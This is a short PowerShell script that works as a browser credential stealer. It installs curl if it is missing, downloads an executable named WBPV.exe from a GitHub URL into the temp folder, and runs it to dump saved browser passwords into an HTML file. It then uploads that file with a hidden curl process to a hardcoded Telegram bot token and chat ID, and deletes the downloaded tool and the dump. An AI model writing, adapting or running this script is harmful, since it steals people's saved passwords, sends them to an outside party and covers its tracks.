Add-Type -AssemblyName System.Net.Http

# Check if curl is already installed
if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
  # Download curl
  $url = "https://curl.se/windows/dl-7.84.0/curl-7.84.0-win64-mingw.zip"
  $output = "$env:TEMP\curl.zip"
  Invoke-WebRequest $url -OutFile $output

  # Create a folder for curl
  $extractPath = "C:\Program Files\curl"
  if (!(Test-Path $extractPath)) {
    New-Item -ItemType Directory -Path $extractPath
  }

  # Extract curl
  Expand-Archive $output $extractPath -Force

  # Add curl to the system path
  $path = [Environment]::GetEnvironmentVariable('Path', 'Machine')
  if (!$path.Contains($extractPath)) {
    [Environment]::SetEnvironmentVariable('Path', "$path;$extractPath\bin", 'Machine')
    Write-Host "curl added to system path. Please restart your session for changes to take effect."
  } else {
    Write-Host "curl is already in the system path."
  }

  # Clean up the downloaded zip file
  Remove-Item $output
} else {
  Write-Host "curl is already installed."
}

$WBPV = "$env:TEMP\WBPV.exe"
$WPs = "$env:TEMP\out.html"

if (!(Test-Path $WBPV)) {
  # Download curl
  $url = "https://raw.github.com/ksp-wrk/s/main/WBPV.exe"
  $args = "/shtml $WPs"
  Invoke-WebRequest $url -OutFile $WBPV
  start-process $WBPV $args -Wait
  #Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "dir C:\" -wait
  #Get-Item $FilePath | Remove-Item
}

$msbuild = "curl"
$arguments = '-s -F document=@"$WPs" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
start-process $msbuild $arguments -WindowStyle Hidden -Wait

$FilePaths1 = @("$env:SystemRoot\Temp\WBPV.exe", "$env:USERPROFILE\AppData\Local\Temp\WBPV.exe")
$FilePaths = @($WBPV, $WPs)
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
